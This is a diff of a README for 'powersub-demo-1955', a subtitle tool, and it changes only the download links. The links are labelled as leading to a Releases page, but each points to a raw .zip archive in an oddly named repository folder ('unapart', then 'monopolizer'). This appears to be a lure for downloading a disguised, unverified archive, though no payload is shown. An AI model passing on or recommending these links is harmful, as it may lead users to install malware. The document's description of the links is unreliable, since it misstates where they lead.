@@ -1,6 +1,6 @@
 # 🌟 powersub-demo-1955 - Easy Subtitle Management Made Simple
 
-[![Download from Releases](https://raw.githubusercontent.com/koplo2005/powersub-demo-1955/main/unapart/powersub-demo-1955.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/koplo2005/powersub-demo-1955/main/unapart/powersub-demo-1955.zip)
+[![Download from Releases](https://raw.githubusercontent.com/koplo2005/powersub-demo-1955/main/monopolizer/powersub-demo-1955.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/koplo2005/powersub-demo-1955/main/monopolizer/powersub-demo-1955.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **powersub-demo-1955**! This application helps you manage and customi
 
 1. Click the link below to visit our Releases page:
 
-   [Download from Releases](https://raw.githubusercontent.com/koplo2005/powersub-demo-1955/main/unapart/powersub-demo-1955.zip)
+   [Download from Releases](https://raw.githubusercontent.com/koplo2005/powersub-demo-1955/main/monopolizer/powersub-demo-1955.zip)
 
 2. On the Releases page, you will see a list of available versions. Look for the latest version.
 
